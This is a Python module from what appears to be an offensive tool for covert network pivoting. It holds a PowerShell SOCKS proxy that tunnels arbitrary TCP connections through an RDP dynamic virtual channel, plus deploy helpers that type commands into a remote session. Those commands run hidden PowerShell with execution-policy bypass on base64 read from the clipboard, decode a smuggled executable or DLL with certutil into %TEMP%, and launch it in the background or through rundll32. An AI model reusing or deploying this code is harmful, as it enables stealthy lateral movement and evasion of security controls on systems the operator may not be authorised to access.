"""Server-side DVC SOCKS component templates and deploy helpers."""

import base64
from pathlib import Path

_PKG_DIR = Path(__file__).parent

_PS1_TEMPLATE = r"""
$ChannelName = "{channel_name}"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class WtsApi {{
    public const int WTS_CHANNEL_OPTION_DYNAMIC = 0x00000001;
    public const int WTS_CURRENT_SESSION = -1;

    [DllImport("wtsapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr WTSVirtualChannelOpenEx(
        int SessionId, string pVirtualName, int flags);

    [DllImport("wtsapi32.dll", SetLastError = true)]
    public static extern bool WTSVirtualChannelRead(
        IntPtr hChannel, int TimeOut, byte[] Buffer,
        int BufferSize, out int pBytesRead);

    [DllImport("wtsapi32.dll", SetLastError = true)]
    public static extern bool WTSVirtualChannelWrite(
        IntPtr hChannel, byte[] Buffer, int Length,
        out int pBytesWritten);

    [DllImport("wtsapi32.dll", SetLastError = true)]
    public static extern bool WTSVirtualChannelClose(IntPtr hChannel);
}}
"@

$MSG_CONNECT=0x01;$MSG_CONNECT_OK=0x02;$MSG_CONNECT_ERR=0x03;$MSG_DATA=0x04;$MSG_CLOSE=0x05
$ATYP_IPV4=0x01;$ATYP_DOMAIN=0x03;$ATYP_IPV6=0x04
$streams=@{{}};$hChannel=[IntPtr]::Zero

function Write-DvcMsg([byte[]]$msg){{$w=0;[WtsApi]::WTSVirtualChannelWrite($hChannel,$msg,$msg.Length,[ref]$w)|Out-Null}}

function Send-ConnectOk([uint32]$sid){{
    $b=New-Object byte[] 5;$b[0]=$MSG_CONNECT_OK
    [Array]::Copy([BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder([int]$sid)),0,$b,1,4)
    Write-DvcMsg $b
}}

function Send-ConnectErr([uint32]$sid,[byte]$errno=1){{
    $b=New-Object byte[] 6;$b[0]=$MSG_CONNECT_ERR
    [Array]::Copy([BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder([int]$sid)),0,$b,1,4)
    $b[5]=$errno;Write-DvcMsg $b
}}

function Send-Data([uint32]$sid,[byte[]]$data){{
    $b=New-Object byte[] (7+$data.Length);$b[0]=$MSG_DATA
    [Array]::Copy([BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder([int]$sid)),0,$b,1,4)
    [Array]::Copy([BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder([int16]$data.Length)),0,$b,5,2)
    [Array]::Copy($data,0,$b,7,$data.Length);Write-DvcMsg $b
}}

function Send-Close([uint32]$sid){{
    $b=New-Object byte[] 5;$b[0]=$MSG_CLOSE
    [Array]::Copy([BitConverter]::GetBytes([System.Net.IPAddress]::HostToNetworkOrder([int]$sid)),0,$b,1,4)
    Write-DvcMsg $b
}}

function Close-Stream([uint32]$sid){{
    if($streams.ContainsKey($sid)){{$s=$streams[$sid];try{{$s.Client.Close()}}catch{{}};try{{$s.ReadTask.Dispose()}}catch{{}};$streams.Remove($sid)}}
}}

function Handle-Connect([uint32]$sid,[byte[]]$payload){{
    if($payload.Length -lt 3){{Send-ConnectErr $sid;return}}
    $atyp=$payload[0];$tgt="";$po=0
    if($atyp -eq $ATYP_IPV4){{$tgt="$($payload[1]).$($payload[2]).$($payload[3]).$($payload[4])";$po=5}}
    elseif($atyp -eq $ATYP_DOMAIN){{$dl=$payload[1];$tgt=[System.Text.Encoding]::ASCII.GetString($payload,2,$dl);$po=2+$dl}}
    elseif($atyp -eq $ATYP_IPV6){{$ib=New-Object byte[] 16;[Array]::Copy($payload,1,$ib,0,16);$tgt=([System.Net.IPAddress]::new($ib)).ToString();$po=17}}
    else{{Send-ConnectErr $sid;return}}
    $port=([int]$payload[$po] -shl 8) -bor [int]$payload[$po+1]
    try{{
        $tcp=New-Object System.Net.Sockets.TcpClient;$tcp.Connect($tgt,$port);$st=$tcp.GetStream()
        $rb=New-Object byte[] 4096;$rt=$st.ReadAsync($rb,0,$rb.Length)
        $streams[$sid]=@{{Client=$tcp;Stream=$st;ReadBuf=$rb;ReadTask=$rt}}
        Send-ConnectOk $sid
    }}catch{{Send-ConnectErr $sid}}
}}

function Handle-Data([uint32]$sid,[byte[]]$payload){{
    if($payload.Length -lt 2){{return}}
    $len=([int]$payload[0] -shl 8) -bor [int]$payload[1]
    if($payload.Length -lt (2+$len)){{return}}
    if(-not $streams.ContainsKey($sid)){{return}}
    $s=$streams[$sid]
    try{{$s.Stream.Write($payload,2,$len)}}catch{{Close-Stream $sid;Send-Close $sid}}
}}

function Poll-Streams{{
    $rem=@()
    foreach($kv in $streams.GetEnumerator()){{
        $sid=$kv.Key;$s=$kv.Value
        if($s.ReadTask.IsCompleted){{
            try{{
                $n=$s.ReadTask.Result
                if($n -gt 0){{$ch=New-Object byte[] $n;[Array]::Copy($s.ReadBuf,$ch,$n);Send-Data $sid $ch;$s.ReadTask=$s.Stream.ReadAsync($s.ReadBuf,0,$s.ReadBuf.Length);$streams[$sid]=$s}}
                else{{$rem+=$sid}}
            }}catch{{$rem+=$sid}}
        }}
    }}
    foreach($sid in $rem){{Close-Stream $sid;Send-Close $sid}}
}}

$hChannel=[WtsApi]::WTSVirtualChannelOpenEx([WtsApi]::WTS_CURRENT_SESSION,$ChannelName,[WtsApi]::WTS_CHANNEL_OPTION_DYNAMIC)
if($hChannel -eq [IntPtr]::Zero){{exit 1}}
$readBuf=New-Object byte[] 65536
try{{
    while($true){{
        $br=0;$ok=[WtsApi]::WTSVirtualChannelRead($hChannel,50,$readBuf,$readBuf.Length,[ref]$br)
        if($ok -and $br -ge 13){{
            $mt=$readBuf[8];$sb=New-Object byte[] 4;[Array]::Copy($readBuf,9,$sb,0,4);[Array]::Reverse($sb)
            $sid=[BitConverter]::ToUInt32($sb,0);$pl=$br-13;$pay=New-Object byte[] $pl
            if($pl -gt 0){{[Array]::Copy($readBuf,13,$pay,0,$pl)}}
            switch($mt){{$MSG_CONNECT{{Handle-Connect $sid $pay}};$MSG_DATA{{Handle-Data $sid $pay}};$MSG_CLOSE{{Close-Stream $sid}}}}
        }}
        Poll-Streams
        if($streams.Count -eq 0 -and -not $ok){{Start-Sleep -Milliseconds 10}}
    }}
}}finally{{
    foreach($sid in @($streams.Keys)){{Close-Stream $sid}}
    [WtsApi]::WTSVirtualChannelClose($hChannel)|Out-Null
}}
"""


def _encode_ps1(channel_name: str) -> str:
    script = _PS1_TEMPLATE.format(channel_name=channel_name)
    return base64.b64encode(script.encode("utf-16-le")).decode("ascii")


def _load_binary(filename: str) -> bytes:
    path = _PKG_DIR / filename
    if not path.is_file():
        return b""
    return path.read_bytes()


def _certutil_b64(data: bytes) -> str:
    """Encode binary as certutil-decodable base64 with PEM headers."""
    b64 = base64.b64encode(data).decode("ascii")
    lines = [b64[i:i + 64] for i in range(0, len(b64), 64)]
    return (
        "-----BEGIN CERTIFICATE-----\n"
        + "\n".join(lines)
        + "\n-----END CERTIFICATE-----"
    )


def deploy_info(method: str, channel_name: str) -> tuple[str | None, list[str]]:
    r"""Return (clipboard_content, command_list) for deploying the server.

    clipboard_content is set in the RDP clipboard before typing commands.
    The first command is typed into Win+R; subsequent commands are typed
    into the cmd window that opens (for exe/dll methods).

    For exe/dll, the binary is transferred via clipboard using certutil:
    clipboard b64 -> gcb|sc to file -> certutil decode -> run.
    """
    if method == "powershell":
        enc = _encode_ps1(channel_name)
        return enc, [
            'powershell -w hidden -ep bypass -c "iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((gcb))))"',
        ]

    if method == "exe":
        data = _load_binary("dvc_server.exe")
        if not data:
            raise RuntimeError("dvc_server.exe not found — cross-compile first")
        return _certutil_b64(data), [
            "cmd",
            'powershell -c "gcb|Out-File -Encoding ascii %TEMP%\\dvc.b64"',
            "certutil -f -decode %TEMP%\\dvc.b64 %TEMP%\\dvc.exe >nul",
            "del %TEMP%\\dvc.b64",
            f"start /b %TEMP%\\dvc.exe {channel_name}",
            "exit",
        ]

    if method == "dll":
        data = _load_binary("dvc_server.dll")
        if not data:
            raise RuntimeError("dvc_server.dll not found — cross-compile first")
        return _certutil_b64(data), [
            "cmd",
            'powershell -c "gcb|Out-File -Encoding ascii %TEMP%\\dvc.b64"',
            "certutil -f -decode %TEMP%\\dvc.b64 %TEMP%\\dvc.dll >nul",
            "del %TEMP%\\dvc.b64",
            f"start /b rundll32 %TEMP%\\dvc.dll,DvcSocksMain {channel_name}",
            "exit",
        ]

    raise ValueError(f"Unknown deploy method: {method}")
